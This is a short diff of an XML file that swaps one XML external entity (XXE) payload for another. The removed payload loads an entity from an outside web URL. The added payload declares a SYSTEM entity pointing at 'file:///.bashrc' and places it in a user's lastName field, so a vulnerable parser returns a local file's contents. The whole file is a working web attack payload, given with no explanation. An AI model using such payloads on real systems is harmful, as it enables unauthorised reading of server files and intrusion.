@@ -1,4 +1,6 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)*>
-<!ENTITY xxe SYSTEM "https://naglinagli.github.io/DoD_Idor">]><foo>&xxe;</foo>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///.bashrc"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
